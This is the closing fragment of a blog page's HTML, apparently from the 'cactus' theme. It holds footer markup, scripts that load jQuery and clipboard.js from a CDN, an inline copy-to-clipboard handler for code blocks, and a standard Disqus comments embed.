    -->
      </ul>
      <ul>
        
      </ul>
    </nav>
  </div>

    
    
</footer>


    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->
 
  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="far fa-clone"></i>';
    btn += '</span>'; 
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Google Analytics -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Umami Analytics -->

<!-- Disqus Comments -->

    <script type="text/javascript">
        var disqus_shortname = 'cactus-1';

        (function(){
            var dsq = document.createElement('script');
            dsq.type = 'text/javascript';
            dsq.async = true;
            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
        }());
    </script>

<!-- utterances Comments -->

</body>
</html>
